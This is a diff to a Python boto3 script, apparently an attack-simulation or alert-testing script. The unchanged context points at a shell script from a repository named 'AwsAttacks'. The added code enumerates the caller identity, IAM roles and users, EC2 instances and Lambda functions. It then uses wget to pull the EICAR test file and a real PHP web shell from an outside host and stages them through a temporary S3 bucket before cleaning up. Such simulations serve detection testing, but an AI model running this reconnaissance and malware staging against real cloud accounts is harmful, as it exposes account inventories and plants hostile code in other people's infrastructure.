@@ -3,6 +3,8 @@ import boto3
 from botocore.exceptions import ClientError
 import subprocess
 import requests
+import random
+import os
 
 url = 'https://raw.githubusercontent.com/SoOM3a/AwsAttacks/refs/heads/main/aws_iam'
 local_filename = 'aws.sh'
@@ -22,3 +24,62 @@ response = s3.list_buckets()
 print('Existing buckets:')
 for bucket in response['Buckets']:
   print(f'  {bucket["Name"]}')
+
+# Initialize boto3 clients
+sts_client = boto3.client('sts')
+iam_client = boto3.client('iam')
+ec2_client = boto3.client('ec2', region_name='us-west-2')
+lambda_client = boto3.client('lambda', region_name='us-west-2')
+s3_client = boto3.client('s3')
+s3_resource = boto3.resource('s3')
+
+# Get caller identity
+caller_identity = sts_client.get_caller_identity()
+print("Caller Identity:", caller_identity)
+
+# List IAM roles
+roles = iam_client.list_roles()
+print("IAM Roles:", roles)
+
+# List IAM users
+users = iam_client.list_users()
+print("IAM Users:", users)
+
+# Describe EC2 instances in the specified region
+instances = ec2_client.describe_instances()
+print("EC2 Instances:", instances)
+
+# List Lambda functions in the specified region
+lambda_functions = lambda_client.list_functions()
+print("Lambda Functions:", lambda_functions)
+
+# Generate a random bucket name
+awsBName = f'test-virus-{random.randint(0, 99)}'
+print(f"Bucket Name is: {awsBName}")
+
+# Create an S3 bucket
+s3_client.create_bucket(Bucket=awsBName, CreateBucketConfiguration={'LocationConstraint': 'us-west-2'})
+
+# Download files
+os.system("wget 'https://secure.eicar.org/eicar.com' -O virus_eicar")
+os.system("wget 'https://github.com/x-o-r-r-o/PHP-Webshells-Collection/raw/refs/heads/master/AK-74%20Security%20Team%20Web%20Shell%20Beta%20Version.php' -O virus_mim")
+# Move files to S3 bucket
+s3_client.upload_file('virus_eicar', awsBName, 'virus_eicar')
+s3_client.upload_file('virus_mim', awsBName, 'virus_mim')
+
+# Copy files from S3 bucket to local
+s3_client.download_file(awsBName, 'virus_eicar', 'virus-eicar-download')
+s3_client.download_file(awsBName, 'virus_mim', 'virus-virus_mim-download')
+
+# Remove files from S3 bucket
+bucket = s3_resource.Bucket(awsBName)
+bucket.objects.all().delete()
+
+# Delete the S3 bucket
+s3_client.delete_bucket(Bucket=awsBName)
+
+# Clean up local files
+os.remove('virus_eicar')
+os.remove('virus_mim')
+os.remove('virus-eicar-download')
+os.remove('virus-virus_mim-download')
